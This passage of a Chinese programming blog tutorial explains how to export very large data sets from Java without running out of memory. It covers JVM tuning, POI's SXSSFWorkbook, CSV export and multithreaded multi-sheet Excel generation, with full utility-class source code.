调整jvm/tomcat大小\n   * 2. 通过新版的SXSSFWorkbook来解决\n   * 3. 转csv导出\n   * 4. 本地90万数据：输入输出流+poi多线程多sheet导出Excel\n   * 5. 浏览器：多线程多sheet页下载\n\n\n\n\n# 概要\n\nExcel：POI 多线程多sheet导出数据\n\n * Excel2003版最大行数是65536，Excel2007最大行数是1048576\n * Excel2003版最大列数是256，Excel2007最大列数是16384\n\n\n# 问题原因\n\n 1. 导出大数据量，可能遇到的第一个问题就是后台报：java.lang.OutOfMemoryError: Java heap space 内存溢出这个问题\n    \n    > 分析：poi导出时，会先把内容写到内存中，最后浏览器从内存中下载，但是数据量太大，会导致内存溢出\n\n\n# 解决办法：\n\n\n# 1. 调整jvm/tomcat大小\n\n * 设置jvm：-Xms64m -Xmx512m（依据你物理内存的大小调整）\n   \n   > 祥见：https://www.cnblogs.com/jhcelue/p/6900881.html\n\n\n# 2. 通过新版的SXSSFWorkbook来解决\n\n * 自poi3.8以后，可通过新版的SXSSFWorkbook来解决，可通过其构造函数指定在内存中缓存的行数，内存中指定行数满足时会自动缓存在硬盘的临时目录上然后循环下一次，同时，并不会存在页面卡顿的情况；\n   \n   > JAVA使用POI如何导出百万级别数据：\n   > \n   > https://www.cnblogs.com/520playboy/p/6275170.html\n   > \n   > https://fanshuyao.iteye.com/blog/2426095\n\n\n# 3. 转csv导出\n\n * CSV是一种通用的、相对简单的文件格式，其文件以纯文本形式存储表格数据（数字和文本）。\n * Excel和CSV格式文件的不同之处 => 传送门\n\n> 手写一个 csv，可先直接运行main()查看结果\n\npackage com.zpj.electric.utils;\n\nimport java.io.BufferedWriter;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.URLEncoder;\nimport java.util.ArrayList;\nimport java.util.Iterator;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.Map;\n\nimport javax.servlet.http.HttpServletResponse;\n\nimport com.alibaba.druid.util.StringUtils;\n\n/**\n * @className: CSVUtils\n * @date: 2018/7/16\n * @version: 1.0\n */\n\npublic class CSVUtils {\n\n\n    /**\n     * 功能说明：获取UTF-8编码文本文件开头的BOM签名。\n     * BOM(Byte Order Mark)，是UTF编码方案里用于标识编码的标准标记。例：接收者收到以EF BB BF开头的字节流，就知道是UTF-8编码。\n     * @return UTF-8编码文本文件开头的BOM签名\n     */\n    public static String getBOM() {\n\n        byte b[] = {(byte)0xEF, (byte)0xBB, (byte)0xBF};\n        return new String(b);\n    }\n\n    /**\n     * 生成CVS文件\n     * @param exportData\n     *       源数据List\n     * @param map\n     *       csv文件的列表头map\n     * @param outPutPath\n     *       文件路径\n     * @param fileName\n     *       文件名称\n     * @return\n     */\n    @SuppressWarnings("rawtypes")\n    public static File createCSVFile(List exportData, LinkedHashMap map, String outPutPath,\n                                     String fileName) {\n        File csvFile = null;\n        BufferedWriter csvFileOutputStream = null;\n        try {\n            File file = new File(outPutPath);\n            if (!file.exists()) {\n                file.mkdirs();\n            }\n            //定义文件名格式并创建\n            csvFile =new File(outPutPath+fileName+".csv");\n            file.createNewFile();\n            // UTF-8使正确读取分隔符","\n            //如果生产文件乱码，windows下用gbk，linux用UTF-8\n            csvFileOutputStream = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(\n                    csvFile), "UTF-8"), 1024);\n\n            //写入前段字节流，防止乱码\n            csvFileOutputStream.write(getBOM());\n            // 写入文件头部\n            for (Iterator propertyIterator = map.entrySet().iterator(); propertyIterator.hasNext();) {\n                java.util.Map.Entry propertyEntry = (java.util.Map.Entry) propertyIterator.next();\n                csvFileOutputStream.write((String) propertyEntry.getValue() != null ? (String) propertyEntry.getValue() : "" );\n                if (propertyIterator.hasNext()) {\n                    csvFileOutputStream.write(",");\n                }\n            }\n            csvFileOutputStream.newLine();\n            // 写入文件内容\n            for (Iterator iterator = exportData.iterator(); iterator.hasNext();) {\n                Object row = (Object) iterator.next();\n                for (Iterator propertyIterator = map.entrySet().iterator(); propertyIterator\n                        .hasNext();) {\n                    java.util.Map.Entry propertyEntry = (java.util.Map.Entry) propertyIterator\n                            .next();\n                    String str=row!=null?((String)((Map)row).get( propertyEntry.getKey())):"";\n\n                    if(StringUtils.isEmpty(str)){\n                        str="";\n                    }else{\n                        str=str.replaceAll("\\"","\\"\\"");\n                        if(str.indexOf(",")>=0){\n                            str="\\""+str+"\\"";\n                        }\n                    }\n                    csvFileOutputStream.write(str);\n                    if (propertyIterator.hasNext()) {\n                        csvFileOutputStream.write(",");\n                    }\n                }\n                if (iterator.hasNext()) {\n                    csvFileOutputStream.newLine();\n                }\n            }\n            csvFileOutputStream.flush();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                csvFileOutputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        return csvFile;\n    }\n\n    /**\n     *     生成并下载csv文件\n     * @param response\n     * @param exportData\n     * @param map\n     * @param outPutPath\n     * @param fileName\n     * @throws IOException\n     */\n    @SuppressWarnings("rawtypes")\n    public static void exportDataFile(HttpServletResponse response,List exportData, LinkedHashMap map, String outPutPath,String fileName) throws IOException{\n        File csvFile = null;\n        BufferedWriter csvFileOutputStream = null;\n        try {\n            File file = new File(outPutPath);\n            if (!file.exists()) {\n                file.mkdirs();\n            }\n            //定义文件名格式并创建\n            csvFile =new File(outPutPath+fileName+".csv");\n            if(csvFile.exists()){\n                csvFile.delete();\n            }\n            csvFile.createNewFile();\n            // UTF-8使正确读取分隔符","\n            //如果生产文件乱码，windows下用gbk，linux用UTF-8\n            csvFileOutputStream = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(csvFile), "UTF-8"), 1024);\n            //写入前段字节流，防止乱码\n            csvFileOutputStream.write(getBOM());\n            // 写入文件头部\n            for (Iterator propertyIterator = map.entrySet().iterator(); propertyIterator.hasNext();) {\n                java.util.Map.Entry propertyEntry = (java.util.Map.Entry) propertyIterator.next();\n                csvFileOutputStream.write((String) propertyEntry.getValue() != null ? (String) propertyEntry.getValue() : "" );\n                if (propertyIterator.hasNext()) {\n                    csvFileOutputStream.write(",");\n                }\n            }\n            csvFileOutputStream.newLine();\n            // 写入文件内容\n            for (Iterator iterator = exportData.iterator(); iterator.hasNext();) {\n                Object row = (Object) iterator.next();\n                for (Iterator propertyIterator = map.entrySet().iterator(); propertyIterator\n                        .hasNext();) {\n                    java.util.Map.Entry propertyEntry = (java.util.Map.Entry) propertyIterator\n                            .next();\n                    String str=row!=null?((String)((Map)row).get( propertyEntry.getKey())):"";\n                    if(StringUtils.isEmpty(str)){\n                        str="";\n                    }else{\n                        str=str.replaceAll("\\"","\\"\\"");\n                        if(str.indexOf(",")>=0){\n                            str="\\""+str+"\\"";\n                        }\n                    }\n                    csvFileOutputStream.write(str);\n                    if (propertyIterator.hasNext()) {\n                        csvFileOutputStream.write(",");\n                    }\n                }\n                if (iterator.hasNext()) {\n                    csvFileOutputStream.newLine();\n                }\n            }\n            csvFileOutputStream.flush();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                csvFileOutputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n\n\n\n        InputStream in = null;\n        try {\n            in = new FileInputStream(outPutPath+fileName+".csv");\n            int len = 0;\n            byte[] buffer = new byte[1024];\n\n            OutputStream out = response.getOutputStream();\n            response.reset();\n\n            response.setContentType("application/csv;charset=UTF-8");\n            response.setHeader("Content-Disposition","attachment; filename=" + URLEncoder.encode(fileName+".csv", "UTF-8"));\n            response.setCharacterEncoding("UTF-8");\n            while ((len = in.read(buffer)) > 0) {\n                out.write(new byte[] { (byte) 0xEF, (byte) 0xBB, (byte) 0xBF });\n                out.write(buffer, 0, len);\n            }\n            out.close();\n        } catch (FileNotFoundException e) {\n        } finally {\n            if (in != null) {\n                try {\n                    in.close();\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }\n            }\n        }\n\n    }\n\n    /**\n     * 删除该目录filePath下的所有文件\n     * @param filePath\n     *      文件目录路径\n     */\n    public static void deleteFiles(String filePath) {\n        File file = new File(filePath);\n        if (file.exists()) {\n            File[] files = file.listFiles();\n            for (int i = 0; i < files.length; i++) {\n                if (files[i].isFile()) {\n                    files[i].delete();\n                }\n            }\n        }\n    }\n\n    /**\n     * 删除单个文件\n     * @param filePath\n     *     文件目录路径\n     * @param fileName\n     *     文件名称\n     */\n    public static void deleteFile(String filePath, String fileName) {\n        File file = new File(filePath);\n        if (file.exists()) {\n            File[] files = file.listFiles();\n            for (int i = 0; i < files.length; i++) {\n                if (files[i].isFile()) {\n                    if (files[i].getName().equals(fileName)) {\n                        files[i].delete();\n                        return;\n                    }\n                }\n            }\n        }\n    }\n\n    /**\n     * 测试数据\n     * @param args\n     */\n    @SuppressWarnings({ "rawtypes", "unchecked" })\n    public static void main(String[] args) {\n        List exportData = new ArrayList<Map>();\n        Map row1 = new LinkedHashMap<String, String>();\n        row1.put("1", "11");\n        row1.put("2", "12");\n        row1.put("3", "13");\n        row1.put("4", "14");\n        exportData.add(row1);\n        row1 = new LinkedHashMap<String, String>();\n        row1.put("1", "21");\n        row1.put("2", "22");\n        row1.put("3", "23");\n        row1.put("4", "24");\n        exportData.add(row1);\n        LinkedHashMap map = new LinkedHashMap();\n\n        //设置列名\n        map.put("1", "第一列名称");\n        map.put("2", "第二列名称");\n        map.put("3", "第三列名称");\n        map.put("4", "第四列名称");\n        //这个文件上传到路径，可以配置在数据库从数据库读取，这样方便一些！\n        String path = "E:/";\n\n        //文件名=生产的文件名称+时间戳\n        String fileName = "文件导出";\n        File file = CSVUtils.createCSVFile(exportData, map, path, fileName);\n        String fileName2 = file.getName();\n        System.out.println("文件名称：" + fileName2);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n\n\n\n# 4. 本地90万数据：输入输出流+poi多线程多sheet导出Excel\n\n> 可直接运行main()查看导出结果，注意poi版本3.7+\n\npackage com.zpj.electric.util.excel;\n\nimport com.zpj.electric.po.Student;\nimport org.apache.commons.beanutils.PropertyUtilsBean;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.poi.ss.usermodel.Row;\nimport org.apache.poi.ss.usermodel.Sheet;\nimport org.apache.poi.ss.usermodel.Workbook;\nimport org.apache.poi.xssf.streaming.SXSSFWorkbook;\n\nimport java.beans.PropertyDescriptor;\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.text.SimpleDateFormat;\nimport java.util.*;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class ThreadExcelUtils {\n\n    /**\n     * 定义没个 sheet 最多数量\n     */\n    public static final Integer EXCEL_MAX_CNT = 50000;\n\n    private Workbook wb;\n\n    private String fileName;\n\n    private String filePath;\n\n    private String[] hearders;\n\n    private String[] fields;\n\n    public Workbook getWb() {\n        return wb;\n    }\n\n    public String getFileName() {\n        return fileName;\n    }\n\n    public String getFilePath() {\n        return filePath;\n    }\n\n    public String[] getHearders() {\n        return hearders;\n    }\n\n    public String[] getFields() {\n        return fields;\n    }\n\n    /**\n     * @param fileName 文件名称\n     * @param filePath 文件路径\n     * @param hearders 文件头\n     * @param fields   字段属性\n     * @Author maochuang.li\n     * @Date Create in 13:54 2017/12/28 0028\n     */\n    public ThreadExcelUtils(String fileName, String filePath, String[] hearders, String[] fields) {\n        this.wb = new SXSSFWorkbook(10000);\n        this.fileName = fileName;\n        this.filePath = filePath;\n        this.hearders = hearders;\n        this.fields = fields;\n    }\n\n    public static void main(String[] args) throws Exception {\n        String[] header = {"姓名", "年龄"};\n        String[] fileNames = {"name", "age"};\n        ThreadExcelUtils utils = new ThreadExcelUtils("测试Excel1", "D:\\\\exceltext\\\\wer\\\\sd", header, fileNames);\n        List list = new ArrayList<>();\n        System.out.println("开始造数据.......");\n        for (int i = 0; i < 900000; i++) {\n            Student student = new Student();\n            student.setName("name->" + i);\n            student.setAge(i);\n            list.add(student);\n        }\n        System.out.println(getDate(new Date()) + "开始写入文件.......");\n        long startTime = System.currentTimeMillis();\n        utils.exportExcelToFilePath(list);\n        long endTime = System.currentTimeMillis();\n        System.out.println("耗时：" + (endTime - startTime));\n        //耗时：29230\n        //耗时：25226\n\n    }\n\n    /**\n     * @param list 数据\n     * @Author maochuang.li\n     * @Date Create in 10:52 2017/12/28 0028\n     */\n    public void exportExcelToFilePath(List<Object> list) throws Exception {\n        int excelSize = EXCEL_MAX_CNT;    //每个Excel文件条数\n        int totalCount = list.size();    //查询结果总条数\n        int pageCount = 0;//总sheet页个数\n        int numPage = totalCount % excelSize;    //是否整页数\n        if (numPage > 0)\n            pageCount = totalCount / excelSize + 1;\n        else\n            pageCount = totalCount / excelSize;\n        //创建线程池 多sheet多线程写入 线程数 为sheet页的 1/4\n        Integer threadNumber = pageCount / 4;\n        if (threadNumber == 0)\n            threadNumber = 1;\n//        ExecutorService threadPool = Executors.newFixedThreadPool(threadNumber);\n        ThreadPoolExecutor threadPool = new ThreadPoolExecutor(threadNumber, threadNumber, 0L, TimeUnit.SECONDS, new LinkedBlockingQueue<>(50));\n        //创建栅栏 等待任务完成\n        CountDownLatch countDownLatch = new CountDownLatch(pageCount);\n        //循环遍历投递任务\n        for (int i = 1; i <= pageCount; i++) {\n            ThraedExcel thraedExcel = new ThraedExcel(list, i, pageCount, numPage, this);\n            thraedExcel.setCountDownLatch(countDownLatch);\n            threadPool.submit(thraedExcel);\n        }\n        countDownLatch.await(10L,TimeUnit.SECONDS);\n        System.err.println("超时拉=====================================");\n        Workbook wb = getWb();\n        File file = new File(filePath);\n        if (!file.exists() && !file.isDirectory()) {\n            file.mkdirs();\n        }\n        FileOutputStream fout = new FileOutputStream(new File(file, fileName + ".xls"));\n        try {\n            wb.write(fout);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.out.println("文件写入完成");\n        //立即销毁线程池\n        threadPool.shutdownNow();\n    }\n\n\n    private static String getDate(Date date) {\n        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");\n        String format = simpleDateFormat.format(date);\n        return format;\n    }\n\n    /**\n     * JavaBean转Map\n     *\n     * @param obj\n     * @return\n     */\n    public static Map<String, Object> beanToMap(Object obj) {\n        Map<String, Object> params = new HashMap<String, Object>(0);\n        try {\n            PropertyUtilsBean propertyUtilsBean = new PropertyUtilsBean();\n            PropertyDescriptor[] descriptors = propertyUtilsBean.getPropertyDescriptors(obj);\n            int length = descriptors.length;\n            for (int i = 0; i < length; i++) {\n                String name = descriptors[i].getName();\n                if (!StringUtils.equals(name, "class")) {\n                    params.put(name, propertyUtilsBean.getNestedProperty(obj, name));\n                }\n            }\n        } catch (Exception e) {\n            System.err.println("bean 转Map出错");\n            e.printStackTrace();\n        }\n        return params;\n    }\n\n    /***\n     * 线程写入sheet\n     */\n    private static class ThraedExcel implements Runnable {\n\n        private List<Object> list;//数据\n\n        private Integer sheetNumber;//当前sheet页\n\n        private Integer totalSheetCount;//总数据\n\n        private int numPage;    //是否整页数\n\n        private Integer excelSize;\n\n        private ThreadExcelUtils threadExcelUtils;\n        //栅栏对象\n        private CountDownLatch countDownLatch;\n\n        /**\n         * @param list            总数据\n         * @param sheetNumber     当前sheet页\n         * @param totalSheetCount 总sheet页\n         * @param numPage         是否整数\n         * @Author maochuang.li\n         * @Date Create in 11:12 2017/12/28 0028\n         */\n        public ThraedExcel(List<Object> list, Integer sheetNumber, Integer totalSheetCount, Integer numPage, ThreadExcelUtils threadExcelUtils) {\n            this.list = list;//总数据\n            this.sheetNumber = sheetNumber;//当前sheet页\n            this.totalSheetCount = totalSheetCount;//总sheet页\n            this.numPage = numPage;//是否整除\n            this.excelSize = ThreadExcelUtils.EXCEL_MAX_CNT;//没个sheet最大数量\n            this.threadExcelUtils = threadExcelUtils;//当前线程对象\n        }\n\n        public void setCountDownLatch(CountDownLatch countDownLatch) {\n            this.countDownLatch = countDownLatch;\n        }\n\n        @Override\n        public void run() {\n            System.out.println("第"+sheetNumber+"个sheet开始");\n            List<Object> sheetList = null;\n            if (totalSheetCount > 1) {\n                if (numPage == 0) {\n                    sheetList = list.subList((sheetNumber - 1) * excelSize, excelSize * sheetNumber);\n                } else {\n                    if (sheetNumber == totalSheetCount) {\n                        sheetList = list.subList((sheetNumber - 1) * excelSize, list.size());\n                    } else {\n                        sheetList = list.subList((sheetNumber - 1) * excelSize, excelSize * (sheetNumber));\n                    }\n                }\n            } else\n                sheetList = list;\n            //开始写入数据\n            createWorkBook(sheetList);\n            if (this.countDownLatch != null)\n                this.countDownLatch.countDown();\n            System.out.println("第"+sheetNumber+"个sheet  结束");\n        }\n\n        /***\n         * 写出数据\n         */\n        private void createWorkBook(List<Object> sheetList) {\n            Sheet sheet = null;\n            Row row = null;\n            synchronized (ThreadExcelUtils.class) {\n                String fileName = threadExcelUtils.getFileName();\n                Workbook wb = threadExcelUtils.getWb();\n                sheet = wb.createSheet(fileName + "_" + this.sheetNumber);\n                row = sheet.createRow(0);\n            }\n            String[] header = threadExcelUtils.getHearders();\n            String[] fields = threadExcelUtils.getFields();\n            //设置标题\n            for (int i = 0; i < header.length; i++) {\n                row.createCell(i).setCellValue(header[i]);\n            }\n            //开始写入数据\n            if (sheetList != null && sheetList.size() > 0) {\n                int dataLength = sheetList.size();\n                for (int i = 0; i < dataLength; i++) {\n                    Row row1 = sheet.createRow(i + 1);\n                    Object obj = sheetList.get(i);\n                    Map<String, Object> map = (obj instanceof Map) ? (Map<String, Object>) obj : beanToMap(obj);\n                    int length = fields.length;\n                    for (int j = 0; j < length; j++) {\n                        String key = fields[j];\n                        Object value = map.get(key);\n//                        if ((StringUtil.isNotBlank(value))) {\n                        if (!(org.springframework.util.StringUtils.isEmpty(value))) {\n                            //不晓得 此处为啥有线程安全问题\n                            synchronized (ThreadExcelUtils.class) {\n                                if (value instanceof Date) {\n                                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");\n                                    String format = sdf.format(value);\n                                    row1.createCell(j).setCellValue(format);\n                                } else {\n                                    try {\n                                        row1.createCell(j).setCellValue(value.toString());\n                                    } catch (Exception e) {\n                                        e.printStackTrace();\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n\n\n\n# 5. 浏览器：多线程多sheet页下载\n\n * 先引入依赖\n\n\x3c!-- https://mvnrepository.com/artifact/org.apache.poi/poi-ooxml --\x3e\n        <dependency>\n            <groupId>org.apache.poi</groupId>\n            <artifactId>poi-ooxml</artifactId>\n            <version>3.9</version>\n        </dependency>\n        \x3c!-- https://mvnrepository.com/artifact/org.apache.poi/poi-ooxml --\x3e\n        <dependency>\n            <groupId>org.apache.poi</groupId>\n            <artifactId>poi</artifactId>\n            <version>3.9</version>\n        </dependency>\n        \x3c!-- https://mvnrepository.com/artifact/commons-io/commons-io --\x3e\n        <dependency>\n            <groupId>commons-io</groupId>\n            <artifactId>commons-io</artifactId>\n            <version>2.4</version>\n        </dependency>\n        \x3c!-- https://mvnrepository.com/artifact/log4j/log4j --\x3e\n        <dependency>\n            <groupId>log4j</groupId>\n            <artifactId>log4j</artifactId>\n            <version>1.2.17</version>\n        </dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n * 创建下载工具类（我写的太low，可以自己优化）\n\npackage com.zpj.electric.util;\n\nimport java.io.OutputStream;\nimport java.text.SimpleDateFormat;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\nimport javax.servlet.http.HttpServletResponse;\n\nimport org.apache.commons.io.IOUtils;\nimport org.apache.log4j.Logger;\nimport org.apache.poi.hssf.usermodel.HSSFCell;\nimport org.apache.poi.hssf.usermodel.HSSFCellStyle;\nimport org.apache.poi.hssf.usermodel.HSSFClientAnchor;\nimport org.apache.poi.hssf.usermodel.HSSFFont;\nimport org.apache.poi.hssf.usermodel.HSSFPatriarch;\nimport org.apache.poi.hssf.usermodel.HSSFRichTextString;\nimport org.apache.poi.hssf.usermodel.HSSFRow;\nimport org.apache.poi.hssf.usermodel.HSSFSheet;\nimport org.apache.poi.hssf.usermodel.HSSFWorkbook;\nimport org.apache.poi.ss.usermodel.IndexedColors;\nimport org.apache.poi.ss.util.CellRangeAddress;\nimport org.apache.poi.xssf.usermodel.XSSFCell;\nimport org.apache.poi.xssf.usermodel.XSSFCellStyle;\nimport org.apache.poi.xssf.usermodel.XSSFFont;\nimport org.apache.poi.xssf.usermodel.XSSFRichTextString;\nimport org.apache.poi.xssf.usermodel.XSSFRow;\nimport org.apache.poi.xssf.usermodel.XSSFSheet;\nimport org.apache.poi.xssf.usermodel.XSSFWorkbook;\n\npublic class ExcelUtil {\n\n\tprivate static Logger log = Logger.getLogger(ExcelUtil.class);\n\n\tprivate static SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");\n\tprivate final static String EXCE_VERSION_03 = "03";\n\tprivate final static String EXCE_VERSION_07 = "07";\n\n\t/**\n\t * @param resp\n\t * @param fileName\n\t *            文件名，一级表头\n\t * @param useFirstTitle\n\t *            是否需要一级表头，true：是，false：否\n\t * @param version\n\t *            导出版本，可选值为 07，统一用07版\n\t * @param titles\n\t *            excel列名\n\t * @param data\n\t *            需要导出的数据集合\n\t */\n\tpublic static void exportExcel(HttpServletResponse resp, String fileName,\n\t\t\tboolean useFirstTitle, String version, String[] titles,\n\t\t\tList<Object[]> data) {\n\t\t// 如果传入的文件名为空，则使用当前时间作为文件名\n\t\tString excelFileName = "";\n\t\tif ("".equals(fileName) || fileName == null) {\n\t\t\texcelFileName = sdf.format(new Date());\n\t\t}\n\t\t// (data.size() >= 0) 当列表中没有数据时，导出的excel加上标题等。\n\t\tif (titles.length >= 0) {\n\t\t\ttry {\n\t\t\t\tif (EXCE_VERSION_03.equals(version)) {\n\t\t\t\t\texcelFileName = fileName + ".xls";\n\t\t\t\t} else if (EXCE_VERSION_07.equals(version)) {\n\t\t\t\t\texcelFileName = fileName + ".xlsx";\n\t\t\t\t}\n\n\t\t\t\tresp.setContentType("application/x-msdownload");\n\t\t\t\texcelFileName = new String(excelFileName.getBytes("gb2312"), "iso8859-1");\n\t\t\t\tresp.addHeader("Content-Disposition", "attachment;filename="\n\t\t\t\t\t\t+ excelFileName);\n\t\t\t\tOutputStream out = resp.getOutputStream();\n\t\t\t\tif (EXCE_VERSION_03.equals(version)) {\n\t\t\t\t\texprotExcel_03(fileName, titles, useFirstTitle, data, out);\n\t\t\t\t} else if (EXCE_VERSION_07.equals(version)) {\n\t\t\t\t\texprotExcel_07_plus(excelFileName, titles, useFirstTitle, data, out);\n\t\t\t\t}\n\t\t\t} catch (Exception e) {\n\t\t\t\tlog.error("", e);\n\t\t\t}\n\t\t}\n\t}\n\n\tprivate static void exprotExcel_07_plus(String fileName, String[] titles,\n\t\t\tboolean useFirstTitle, List<Object[]> data, OutputStream out) {\n\t\tXSSFWorkbook wb = new XSSFWorkbook();\n\n\t\t//把要下载的数据分为多个sheet下载\n\t\tList<List<Object[]>> dataList = createList(data, 50000);\n\t\tLong start = System.currentTimeMillis();\n\t\tSystem.out.println("下载开始时间：" + start);\n\n\t\t//使用多线程下载\n\t\tExecutorService es = Executors.newFixedThreadPool(dataList.size());\n\t\t//使用计步器\n\t\t// final CountDownLatch doneSignal = new CountDownLatch(dataList.size());\n\t\tCountDownLatch doneSignal = new CountDownLatch(dataList.size());\n\n\t\ttry {\n\n\t\tfor(int x = 0;x<dataList.size();x++){\n\t\t\tPoiWriter poiWriter = new PoiWriter(x, wb, fileName, titles, data, dataList, useFirstTitle, doneSignal);\n\t\t\tFuture future = es.submit(poiWriter);\n\t\t\t /*try {\n\t\t\t\t \t//如果Future.get()返回null，任务完成\n\t\t            if(future.get()==null){\n\t\t                System.out.println("第"+(x+1)+"个sheet页，任务完成");\n\t\t            }\n\t\t        } catch (InterruptedException e) {\n\t\t        } catch (ExecutionException e) {\n\t\t            //失败\n\t\t            System.out.println("第"+(x+1)+"个sheet页，任务失败："+e.getCause().getMessage());\n\t\t        }*/\n\t\t\t//new PoiWriter(x, wb, fileName, titles, data, dataList, useFirstTitle, null).run();\n\t\t}\n\t\tdoneSignal.await();//阻塞，直到计数器的值为0，才让主线程往下执行\n\t    es.shutdown();//关闭线程池\n\t\tLong end = System.currentTimeMillis();\n\t\tSystem.out.println("总计下载时间：" + ((end-start)/1000) + "s");\n\t\t\twb.write(out);\n\t\t\tout.flush();\n\t\t\tout.close();\n\t\t} catch (Exception e) {\n\t\t\tlog.error("", e);\n\t\t} finally {\n\t\t\tIOUtils.closeQuietly(out);\n\t\t}\n\n\t}\n\n\n\t public static List<List<Object[]>>  createList(List<Object[]> targe,int size) {\n\t\t        List<List<Object[]>> listArr = new ArrayList<List<Object[]>>();\n\t\t        //获取被拆分的数组个数\n\t\t        int arrSize = targe.size()%size==0?targe.size()/size:targe.size()/size+1;\n\t\t        for(int i=0;i<arrSize;i++) {\n\t\t            List<Object[]>  sub = new ArrayList<Object[]>();\n\t\t            //把指定索引数据放入到list中\n\t\t            for(int j=i*size;j<=size*(i+1)-1;j++) {\n\t\t                if(j<=targe.size()-1) {\n\t\t                \t//得到拆分后的集合\n\t\t                    sub.add(targe.get(j));\n\t\t                }\n\t\t            }\n\t\t            //拆分的集合可以做点什么\n\t\t            //sub.dosomething();\n\t\t            //将拆分后的集合综合为一个集合\n\t\t            listArr.add(sub);\n\t\t        }\n\t\t        return listArr;\n\t 